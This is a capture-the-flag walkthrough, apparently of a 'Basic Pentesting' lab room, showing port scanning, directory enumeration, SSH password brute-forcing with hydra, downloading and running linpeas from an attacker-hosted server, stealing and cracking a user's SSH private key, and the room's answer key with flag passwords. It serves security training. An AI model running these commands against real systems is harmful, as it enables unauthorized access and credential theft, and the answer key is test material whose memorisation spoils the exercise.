# Basic Pentesting 

IP address through my machine is `10.10.238.74`

## Enumeration and Scanning

`ping 10.10.238.74` we can see that the system is alive

Doing Nmap scan for open ports `nmap -sC -sV 10.10.238.74`

![image](https://github.com/user-attachments/assets/44512de5-b865-446f-a147-7dacf24ba242)

Open Ports are 22, 80, 139, 445, 8009 and 8080 

As the port 80 is open meaning there is a website now lets check the website

![image](https://github.com/user-attachments/assets/b8f5689d-8029-452e-a8a7-1f692fa500d2)

![image](https://github.com/user-attachments/assets/aea1aaa5-1ee0-4452-8774-903d186e7901)

The page source says to check the dev note section.

If we try `10.10.238.74/dev` we get the version of the service and name.

![image](https://github.com/user-attachments/assets/02fdf0b6-b6e8-46a8-810c-d728ae1a68aa)

As we donâ€™t know how many paths are there so we will find that through a tool gobuster.

`gobuster dir -u http://10.10.238.74/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

![image](https://github.com/user-attachments/assets/70e33c34-5273-4206-bdb7-6624add2d356)

In the development path we see files

![image](https://github.com/user-attachments/assets/5c86ba6c-4004-4fe2-bef4-e272115ccfb7)

![image](https://github.com/user-attachments/assets/dfecb44f-2ed2-435f-9882-0ccc4985257e)

![image](https://github.com/user-attachments/assets/58f5a305-2ce5-4bdf-af65-a6146a637c8b)

## Exploitation

From the dev notes we can see that it uses weak password which can be a vulnerability and can be accessed through bruteforcing user and passwords.

Finding the users in this system `enum4linux -a 10.10.238.74`

![image](https://github.com/user-attachments/assets/30407462-2534-47e0-9c78-db15ad016373)

Now bruteforcing the password through hydra tool `hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.238.74`

![image](https://github.com/user-attachments/assets/33b4c677-6144-4a17-919a-d1e9255c5381)

Now connecting through jan login `ssh jan@10.10.238.74`

We can easily move to the kay login to by the home directory but we can see from the `sudo ls` command, there is usually no permission to access the important files other than the root.

![image](https://github.com/user-attachments/assets/7802cfd2-0a58-44d0-a324-840328781ebd)

## Privilege Escalation

LinEnum and LinPeas: These are tools for local privilege escalation enumeration on Linux. They scan the system for potential misconfigurations or vulnerabilities that could be used to elevate privileges. 

Start a Python HTTP server to transfer scripts from your local machine to the target: `python3 -m http.server --bind <your-tun0-address> 8000`

I am using `linpeas.sh` for privilege escalation

We will download the `linpeas.sh` file in the jan system so we need to move in the directory that has write access usually /home or /tmp.

`cd /tmp`

`wget http://<your-tun0-address>:8000/linpeas.sh`

Make the script executable and run it.

`chmod +x linpeas.sh`

`./linpeas.sh`

![image](https://github.com/user-attachments/assets/7cee61fd-20b9-404a-8f1b-b664e27b9264)

As we can easily move to the kay folder without even knowing the password, move to the folder containing the id_rsa

`cd /home/kay/.ssh`

Copy the id_rsa and create a file named id_rsa in your local machine through `nano`. Paste the contents of the id_rsa and saved it.

Give appropriate permissions: `chmod 600 id_rsa`

John is a password-cracking tool designed to detect weak passwords and brute-force password hashes. First, convert the id_rsa file using ssh2john: `ssh2john id_rsa > john-pass`

Then use john the ripper to crack the password `john --wordlist=/usr/share/wordlists/rockyou.txt john-pass`

Password is beeswax

![image](https://github.com/user-attachments/assets/688a1c45-f263-440f-869d-13ec742abb53)

Now we have the password and the id_rsa, we can ssh login to kay to get the final password `ssh -i id_rsa kay@10.10.238.74`

Cat the contents of the `pass.bak` and we have the final password

![image](https://github.com/user-attachments/assets/f831b824-5337-4426-93c6-e41797d1d6a1)

## Answer the questions below

1. What is the name of the hidden directory on the web server(enter name without /)?

development

2. What is the username?

jan

3. What is the password?

armando

4. What service do you use to access the server(answer in abbreviation in all caps)?

SSH

5. What is the name of the other user you found(all lower case)?

kay

6. What is the final password you obtain?

hereareallystringpasswordthatfollowsthepasswordpolicy$$
